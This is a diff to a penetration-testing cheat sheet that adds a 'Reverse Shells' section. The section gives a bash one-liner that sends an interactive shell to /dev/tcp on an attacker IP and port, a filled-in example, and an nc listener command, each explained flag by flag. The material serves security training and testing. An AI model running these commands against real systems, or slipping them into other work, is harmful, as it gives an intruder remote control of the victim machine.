@@ -8,6 +8,8 @@
     - [SMB](#smb)
     - [NFS](#nfs)
     - [FTP](#ftp)
+- [Reverse Shells](#reverse-shells)
+  - [Bash Reverse Shell](#bash-reverse-shell)
 - [Privilege Escalation](#privilege-escalation)
   - [Linux](#linux)
     - [SUID Files](#suid-files)
@@ -158,6 +160,27 @@ nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst <target>
 * `ftp-anon.nse`: Checks if anonymous FTP login is allowed
 * `ftp-bounce.nse`: Checks for FTP bounce attack vulnerability
 * `ftp-syst.nse`: Retrieves system information from FTP server
+
+---
+
+## Reverse Shells
+
+### Bash Reverse Shell
+
+* **Bash Reverse Shell** - Creates a reverse shell connection back to the attacker's machine using bash
+
+```bash
+bash -i >& /dev/tcp/{ATTACKER-IP}/{PORT} 0>&1
+```
+
+* `bash -i`: Starts an interactive bash shell
+* `>& /dev/tcp/{ATTACKER-IP}/{PORT}`: Redirects stdout and stderr to a TCP connection to the attacker's IP and port
+* `0>&1`: Redirects stdin (file descriptor 0) to stdout (file descriptor 1), completing the bidirectional connection
+* Replace `{ATTACKER-IP}` with your attacking machine's IP address (e.g., `10.10.10.5`)
+* Replace `{PORT}` with the port you're listening on (e.g., `4444`)
+* **On attacker machine**, set up a listener first: `nc -lvnp <PORT>` or `rlwrap nc -lvnp <PORT>` (for better shell interaction)
+* Example: `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1`
+* Works on systems with bash and `/dev/tcp` support (most Linux systems)
 
 ---
 
